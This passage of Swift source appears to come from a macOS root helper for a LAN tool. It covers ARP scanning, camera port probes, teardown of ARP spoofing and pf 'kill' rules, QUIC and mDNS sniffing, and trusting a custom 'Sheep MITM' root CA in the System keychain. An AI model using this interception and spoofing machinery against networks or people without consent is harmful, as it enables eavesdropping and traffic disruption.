    }
    let result = runCommand("/usr/local/bin/tailscale", args: args)
    if result.status == 0 {
        return .ok(message: "tailscale: up")
    }
    return .error(message: "tailscale: up failed: \(result.output)")
}

func handleTailscaleDown() -> HelperResponse {
    let result = runCommand("/usr/local/bin/tailscale", args: ["down"])
    if result.status == 0 {
        return .ok(message: "tailscale: down")
    }
    return .error(message: "tailscale: down failed: \(result.output)")
}

/// Parse a byte count like "1.23 KiB" into raw bytes.
private func parseBytes(_ s: String) -> UInt64 {
    let parts = s.split(separator: " ")
    guard parts.count >= 2 else { return 0 }
    guard let value = Double(parts[0]) else { return 0 }
    let unit = String(parts[1]).lowercased()
    switch unit {
    case "b": return UInt64(value)
    case "kib", "kb", "k": return UInt64(value * 1024)
    case "mib", "mb", "m": return UInt64(value * 1024 * 1024)
    case "gib", "gb", "g": return UInt64(value * 1024 * 1024 * 1024)
    default: return UInt64(value)
    }
}

/// Run a command and capture its stdout+stderr and exit status.
struct CommandResult {
    let status: Int32
    let output: String
}

private func runCommand(_ path: String, args: [String]) -> CommandResult {
    let proc = Process()
    proc.executableURL = URL(fileURLWithPath: path)
    proc.arguments = args
    let pipe = Pipe()
    proc.standardOutput = pipe
    proc.standardError = pipe
    do {
        try proc.run()
        proc.waitUntilExit()
    } catch {
        return CommandResult(status: -1, output: "exec failed: \(error)")
    }
    let data = pipe.fileHandleForReading.readDataToEndOfFile()
    let output = String(data: data, encoding: .utf8) ?? ""
    return CommandResult(status: proc.terminationStatus, output: output)
}

// MARK: - Uninstall handler (step 7)

func handleUninstall() -> HelperResponse {
    // Run the uninstaller script.
    let scriptPath = "/usr/local/sbin/pastoral-reset.sh"
    // The full uninstaller is in the Installer/scripts directory; when
    // installed via the .pkg, we copy it to /usr/local/sbin/pastoral-uninstall.sh
    let uninstallPath = "/usr/local/sbin/pastoral-uninstall.sh"

    // Try the installed uninstaller first, then the bundled one.
    if FileManager.default.fileExists(atPath: uninstallPath) {
        runShell("\(uninstallPath)")
    } else {
        // Inline uninstall: remove everything we can.
        // Stop spoofing and restore network.
        cleanupAll()
        // Unload LaunchDaemons.
        runShell("launchctl bootout system/com.pastoral.helper 2>/dev/null || true")
        runShell("launchctl bootout system/com.pastoral.reset 2>/dev/null || true")
        runShell("launchctl unload /Library/LaunchDaemons/com.pastoral.helper.plist 2>/dev/null || true")
        runShell("launchctl unload /Library/LaunchDaemons/com.pastoral.reset.plist 2>/dev/null || true")
        // Remove plists.
        runShell("rm -f /Library/LaunchDaemons/com.pastoral.helper.plist")
        runShell("rm -f /Library/LaunchDaemons/com.pastoral.reset.plist")
        // Remove binaries.
        runShell("rm -f /usr/local/sbin/pastoral-helper")
        runShell("rm -f /usr/local/sbin/pastoral-reset.sh")
        runShell("rm -f /var/run/pastoral.sock")
        // Remove CA from Keychain.
        runShell("security delete-certificate -c \"Pastoral CA\" /Library/Keychains/System.keychain 2>/dev/null || true")
        // Remove state dir.
        runShell("rm -rf ~/Library/Application\\ Support/Pastoral")
        runShell("rm -rf /var/db/pastoral")
    }

    return .ok(message: "Pastoral desinstalado")
}

// MARK: - Cleanup (called on exit / SIGTERM)

func cleanupAll() {
    // Stop QUIC sniffing and close the BPF device.
    quicSniffer?.stop()
    quicSniffer = nil
    quicConnFD = -1
    // Stop mDNS/LLMNR sniffing.
    mdnsSniffer?.stop()
    mdnsSniffer = nil
    mdnsConnFD = -1
    // Tear down the WireGuard tunnel (phase 6).
    if let iface = activeWGInterface {
        _ = runCommand("/usr/local/bin/wg-quick", args: ["down", iface])
        _ = runCommand("/bin/rm", args: ["-f", "/etc/wireguard/\(iface).conf"])
        activeWGInterface = nil
    }
    // Clear selective Kill + dummynet anchors.
    runShell("pfctl -a \(PFAnchorManager.selectiveAnchor) -F rules 2>/dev/null || true")
    runShell("pfctl -a \(PFAnchorManager.dummynetAnchor) -F rules 2>/dev/null || true")
    // Stop all spoofing and send restoration frames.
    spoofer?.stopAll()
    divertTargets.removeAll()
    // Clear pf drop rules and restore pfConf from backup.
    pfManager.restore()
    // Restore forwarding state.
    _ = forwardingManager.restore()
}

// MARK: - Shell capture

func runCapture(_ path: String, _ args: [String]) -> String? {
    let p = Process()
    p.executableURL = URL(fileURLWithPath: path)
    p.arguments = args
    let pipe = Pipe()
    p.standardOutput = pipe
    p.standardError = Pipe()
    do { try p.run(); p.waitUntilExit() } catch { return nil }
    return String(data: pipe.fileHandleForReading.readDataToEndOfFile(), encoding: .utf8)
}

/// Run an active ARP scan on the default interface. Discovers the local
/// IP/MAC from the interface, scans the /24, and returns the merged table.
func handleScanARP() -> HelperResponse {
    let iface = probe.defaultInterface() ?? "en0"
    // Discover local IP + MAC from the interface.
    guard let localIP = localIPv4(of: iface) else {
        return .error(message: "no IPv4 on \(iface)")
    }
    guard let localMAC = localMAC(of: iface) else {
        return .error(message: "no MAC on \(iface)")
    }
    let scanner = ARPScanner(interface: iface, localIP: localIP, localMAC: localMAC)
    let hosts = scanner.scan(timeoutSeconds: 2)
    return .arpTable(hosts: hosts)
}

/// Get the IPv4 address of an interface as 4 bytes.
func localIPv4(of iface: String) -> [UInt8]? {
    var addrs: UnsafeMutablePointer<ifaddrs>? = nil
    guard getifaddrs(&addrs) == 0, let first = addrs else { return nil }
    defer { freeifaddrs(first) }
    var cursor: UnsafeMutablePointer<ifaddrs>? = first
    while let ptr = cursor {
        let name = String(cString: ptr.pointee.ifa_name)
        if name == iface, let sa = ptr.pointee.ifa_addr,
           Int32(sa.pointee.sa_family) == AF_INET {
            var ip: [UInt8] = [0, 0, 0, 0]
            let result = sa.withMemoryRebound(to: sockaddr_in.self, capacity: 1) { sin in
                pastoral_extract_ipv4(sin, &ip)
            }
            if result == 0 { return ip }
        }
        cursor = ptr.pointee.ifa_next
    }
    return nil
}

/// Get the MAC address of an interface.
func localMAC(of iface: String) -> MAC? {
    var addrs: UnsafeMutablePointer<ifaddrs>? = nil
    guard getifaddrs(&addrs) == 0, let first = addrs else { return nil }
    defer { freeifaddrs(first) }
    var cursor: UnsafeMutablePointer<ifaddrs>? = first
    while let ptr = cursor {
        let name = String(cString: ptr.pointee.ifa_name)
        if name == iface, let sa = ptr.pointee.ifa_addr,
           Int32(sa.pointee.sa_family) == AF_LINK {
            var macBytes: [UInt8] = [0, 0, 0, 0, 0, 0]
            let result = sa.withMemoryRebound(to: sockaddr_dl.self, capacity: 1) { sdl in
                pastoral_extract_mac(sdl, &macBytes)
            }
            if result == 0 { return MAC(macBytes) }
        }
        cursor = ptr.pointee.ifa_next
    }
    return nil
}

// MARK: - Signal handling & cleanup

// These globals are accessed from the single-threaded accept loop and the
// signal handler; marked nonisolated(unsafe) to satisfy Swift 6 concurrency.
nonisolated(unsafe) var shouldStop = false
nonisolated(unsafe) var ownedFD: Int32? = nil

func installSignals() {
    signal(SIGPIPE, SIG_IGN)
    for sig in [SIGTERM, SIGINT] {
        let src = DispatchSource.makeSignalSource(signal: sig, queue: .global())
        src.setEventHandler {
            shouldStop = true
            // Restore network state before exiting so the LAN isn't left
            // broken if the helper dies. This runs synchronously in the
            // signal handler thread; cleanupAll is designed to be quick.
            cleanupAll()
        }
        src.resume()
        signal(sig, SIG_IGN)   // prevent default termination; handled by source
    }
    atexit {
        // Also clean up on normal exit (e.g. launchd unload).
        cleanupAll()
        if let fd = ownedFD {
            close(fd)
            unlink(socketPath)
        }
    }
}

// MARK: - Main

func main() {
    installSignals()
    resetBPF()

    guard let source = makeListener() else {
        FileHandle.standardError.write("pastoral-helper: failed to create socket\n".data(using: .utf8)!)
        exit(1)
    }

    let listenFD: Int32
    switch source {
    case .launchd(let fd):
        listenFD = fd
    case .owned(let fd):
        listenFD = fd
        ownedFD = fd   // we unlink this on exit
    }

    FileHandle.standardError.write("pastoral-helper: listening on \(socketPath)\n".data(using: .utf8)!)

    // Accept loop. Each connection is handled inline (the protocol is
    // request/response and short-lived; concurrency is added if needed).
    while !shouldStop {
        let conn = accept(listenFD, nil, nil)
        if conn < 0 {
            if errno == EINTR { continue }
            break
        }
        var peerUID: uid_t = 0
        var peerGID: gid_t = 0
        guard getpeereid(conn, &peerUID, &peerGID) == 0,
              peerUID == 0 || peerUID == consoleUID() else {
            close(conn)
            continue
        }
        // Handle on a side thread: the accept loop must stay free so a
        // long-lived streaming client (mDNS/QUIC capture) or a dead peer
        // can never leave every other request unanswered.
        let thread = Thread { handleConnection(conn) }
        thread.stackSize = 512 * 1024
        thread.start()
    }

    // Clean up all network state before exiting.
    cleanupAll()

    if let fd = ownedFD {
        close(fd)
        unlink(socketPath)
    }
}

main()

// MARK: - Port probe (camera confirmation)

/// Probe a set of TCP ports on a target IP with a short connect timeout.
/// Used to confirm cameras that don't advertise Bonjour: RTSP (554),
/// ONVIF (3702/8000), HTTP (80/8080). Returns the subset that are open.
func handlePortProbe(targetIP: String, ports: [UInt16]) -> HelperResponse {
    var open: [UInt16] = []
    for port in ports {
        if isTCPPortOpen(host: targetIP, port: port, timeoutMS: 300) {
            open.append(port)
        }
    }
    return .portProbeResult(targetIP: targetIP, openPorts: open)
}

/// Quick non-blocking TCP connect probe. Returns true if the port
/// accepted a connection within `timeoutMS`.
private func isTCPPortOpen(host: String, port: UInt16, timeoutMS: Int) -> Bool {    var hints = addrinfo()
    hints.ai_family = AF_INET
    hints.ai_socktype = SOCK_STREAM
    var info: UnsafeMutablePointer<addrinfo>?
    guard getaddrinfo(host, String(port), &hints, &info) == 0, let ai = info else {
        return false
    }
    defer { freeaddrinfo(info) }
    let s = socket(ai.pointee.ai_family, ai.pointee.ai_socktype, ai.pointee.ai_protocol)
    guard s >= 0 else { return false }
    defer { close(s) }
    // Non-blocking connect with poll timeout.
    let flags = fcntl(s, F_GETFL, 0)
    _ = fcntl(s, F_SETFL, flags | O_NONBLOCK)
    let rc = Darwin.connect(s, ai.pointee.ai_addr, ai.pointee.ai_addrlen)
    if rc == 0 { return true }
    if errno != EINPROGRESS { return false }
    var pfd = pollfd(fd: s, events: Int16(POLLOUT), revents: 0)
    let pr = poll(&pfd, 1, Int32(timeoutMS))
    if pr <= 0 || (pfd.revents & Int16(POLLOUT)) == 0 { return false }
    var err: Int32 = 0
    var len = socklen_t(MemoryLayout<Int32>.size)
    guard getsockopt(s, SOL_SOCKET, SO_ERROR, &err, &len) == 0, err == 0 else {
        return false
    }
    return true
}

// MARK: - CA trust handlers (Sheep MITM)
//
// Writing to /Library/Keychains/System.keychain needs root, so the app
// only exports the CA DER and asks here; the helper (LaunchDaemon, root)
// does the `security` calls.

func runSecurity(_ args: [String]) -> (Int32, String) {
    let p = Process()
    p.executableURL = URL(fileURLWithPath: "/usr/bin/security")
    p.arguments = args
    let pipe = Pipe()
    p.standardOutput = pipe
    p.standardError = pipe
    do { try p.run(); p.waitUntilExit() } catch { return (-1, "") }
    let out = String(data: pipe.fileHandleForReading.readDataToEndOfFile(),
                     encoding: .utf8) ?? ""
    return (p.terminationStatus, out)
}

/// Marca o DER da CA como raiz confiável no System.keychain. Se já
/// existir com outro hash, remove e tenta de novo (reinstall idempotente).
func handleCATrustInstall(certPath: String) -> HelperResponse {
    guard FileManager.default.fileExists(atPath: certPath) else {
        return .error(message: "arquivo da CA não encontrado: \(certPath)")
    }
    let addArgs = ["add-trusted-cert", "-d", "-r", "trustRoot",
                   "-k", "/Library/Keychains/System.keychain", certPath]
    var (status, output) = runSecurity(addArgs)
    if status != 0 {
        _ = runSecurity(["remove-trusted-cert", "-d", certPath,
                         "-k", "/Library/Keychains/System.keychain"])
        (status, output) = runSecurity(addArgs)
    }
    if status == 0 {
        return .ok(message: "CA Pastoral instalada como confiável")
    }
    return .error(message: "security add-trusted-cert falhou: \(output.trimmingCharacters(in: .whitespacesAndNewlines))")
}

/// Remove a confiança (e o certificado) da CA do System.keychain.
/// Idempotente — remover algo que não está instalado é sucesso.
func handleCATrustRemove(certPath: String) -> HelperResponse {
    _ = runSecurity(["remove-trusted-cert", "-d", certPath,
                     "-k", "/Library/Keychains/System.keychain"])
    _ = runSecurity(["delete-certificate", "-c", "Pastoral CA",
                     "/Library/Keychains/System.keychain"])
    return .ok(message: "confiança da CA removida")
}
